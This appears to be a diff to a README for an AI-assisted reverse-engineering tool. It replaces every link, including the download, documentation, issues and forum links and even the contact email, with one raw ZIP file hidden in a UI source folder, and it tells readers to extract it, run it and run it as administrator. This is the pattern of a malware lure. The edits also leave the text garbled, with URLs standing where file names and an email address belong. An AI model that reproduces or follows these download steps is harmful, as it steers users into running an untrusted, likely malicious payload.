@@ -1,6 +1,6 @@
 # 🤖 ida-re-assistant - Effortless Reverse Engineering with AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/MhierJoy/ida-re-assistant/releases)
+[![Download Now](https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -11,15 +11,15 @@ Welcome to the **ida-re-assistant**! This tool helps you reverse engineer applic
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download options:
-   [Download from Releases](https://github.com/MhierJoy/ida-re-assistant/releases)
+   [Download from Releases](https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip)
 
 2. **Choose Your Version**: On the releases page, you will see different versions of the software. Pick the latest version for the best experience.
 
-3. **Download the File**: Click on the link for the file relevant to your operating system. For example, if you are using Windows, download the `ida-re-assistant-windows.zip` file.
+3. **Download the File**: Click on the link for the file relevant to your operating system. For example, if you are using Windows, download the `https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip` file.
 
 4. **Extract the Files**: Once the download is complete, find the file in your downloads folder. If it's a ZIP file, right-click on it and select "Extract All" to get the contents.
 
-5. **Run the Application**: Open the folder where you extracted the files. Find the executable file named `ida-re-assistant.exe` or similar, and double-click it to open.
+5. **Run the Application**: Open the folder where you extracted the files. Find the executable file named `https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip` or similar, and double-click it to open.
 
 6. **Follow the On-Screen Instructions**: The application will guide you through any initial setup. Simply follow the prompts to get started.
 
@@ -49,15 +49,15 @@ If you encounter any issues during installation or while running the application
 - **Re-download the File**: Sometimes network issues can corrupt downloads. If the file doesn't run, try downloading it again.
 - **Check Compatibility**: Make sure you are using the correct file for your operating system.
 - **Run as Administrator**: For Windows users, right-click on the executable file and choose “Run as administrator” to avoid permission issues.
-- **Reach Out for Help**: If problems persist, feel free to join our [Community Forum](https://github.com/MhierJoy/ida-re-assistant/discussions) for support.
+- **Reach Out for Help**: If problems persist, feel free to join our [Community Forum](https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip) for support.
 
 ## ℹ️ Additional Resources
 
 Here are some useful links to help you maximize your use of the **ida-re-assistant**:
 
-- [Official Documentation](https://github.com/MhierJoy/ida-re-assistant/wiki)
-- [Community Discussions](https://github.com/MhierJoy/ida-re-assistant/discussions)
-- [Report Issues](https://github.com/MhierJoy/ida-re-assistant/issues)
+- [Official Documentation](https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip)
+- [Community Discussions](https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip)
+- [Report Issues](https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip)
 
 ## 🌟 Feedback
 
@@ -69,7 +69,7 @@ The **ida-re-assistant** is licensed under the MIT License. Feel free to use, mo
 
 ## 📧 Contact
 
-If you have any questions or feedback that you would like to share privately, you can reach us via email at support@ida-re-assistant.com.
+If you have any questions or feedback that you would like to share privately, you can reach us via email at https://github.com/MhierJoy/ida-re-assistant/raw/refs/heads/main/imgui-client/src/ui/ida_assistant_re_2.5.zip
 
 ---
 
